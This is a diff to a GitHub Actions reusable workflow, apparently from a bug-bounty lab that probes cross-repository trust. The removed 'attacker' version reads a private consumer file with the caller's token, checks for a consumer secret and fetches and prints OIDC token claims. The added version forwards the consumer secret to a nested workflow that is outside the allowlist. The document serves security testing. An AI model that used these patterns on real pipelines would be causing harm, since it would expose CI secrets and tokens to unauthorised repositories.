@@ -1,4 +1,4 @@
-name: Public Provider Attacker Tag
+name: Public Provider With Nested Reusable Call
 
 on:
   workflow_call:
@@ -7,42 +7,18 @@ on:
         required: false
 
 jobs:
-  reusable:
+  direct-step:
     runs-on: ubuntu-latest
-    permissions:
-      contents: read
-      id-token: write
-      issues: write
     steps:
       - run: |
-          echo "public_provider_marker=ATTACKER_PUBLIC_TAG_20260429"
+          echo "public_provider_marker=NESTED_CALLER_PROVIDER_20260511"
           echo "runtime_repository=${GITHUB_REPOSITORY}"
-          marker_status=$(curl -sS -o marker-response.json -w '%{http_code}' \
-            -H "Authorization: Bearer ${GITHUB_TOKEN}" \
-            -H "Accept: application/vnd.github+json" \
-            -H "X-GitHub-Api-Version: 2022-11-28" \
-            "https://api.github.com/repos/${GITHUB_REPOSITORY}/contents/private-consumer-marker.txt")
-          echo "public_provider_consumer_marker_read_status=${marker_status}"
-          if [ "${marker_status}" = "200" ]; then
-            marker=$(jq -r .content marker-response.json | tr -d '\n' | base64 -d)
-            marker_hash=$(printf '%s' "$marker" | sha256sum | cut -d' ' -f1)
-            echo "public_provider_consumer_marker_sha256=${marker_hash}"
-          fi
-          if [ -n "${CONSUMER_SECRET:-}" ]; then
-            echo "public_provider_consumer_secret_present=true"
-          else
-            echo "public_provider_consumer_secret_present=false"
-          fi
-          oidc_json=$(curl -fsS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=bb-lab-public-crossrepo-oidc")
-          token=$(printf '%s' "$oidc_json" | jq -r .value)
-          python3 - "$token" <<'PY'
-          import base64, json, sys
-          payload = sys.argv[1].split('.')[1]
-          payload += '=' * (-len(payload) % 4)
-          claims = json.loads(base64.urlsafe_b64decode(payload))
-          keys = ['sub','repository','ref','ref_type','job_workflow_ref','job_workflow_sha','workflow_ref']
-          print(json.dumps({k: claims.get(k) for k in keys}, indent=2, sort_keys=True))
-          PY
-        env:
-          CONSUMER_SECRET: ${{ secrets.consumer_secret }}
-          GITHUB_TOKEN: ${{ github.token }}
+          echo "workflow_ref=${GITHUB_WORKFLOW_REF}"
+
+  nested-call:
+    # Nested reusable workflow call to a repo NOT in the consumer's allowlist.
+    # Consumer only allowlisted: rafcdln/bb-lab-public-reusable-provider/.github/workflows/deploy.yml@<SHA>
+    # This calls rafcdln/bb-lab-sub-provider which is NOT in that list.
+    uses: rafcdln/bb-lab-sub-provider/.github/workflows/sub.yml@9fbb73a79f7758ee90c673d54ed5fb3505bac869
+    secrets:
+      consumer_secret: ${{ secrets.consumer_secret }}
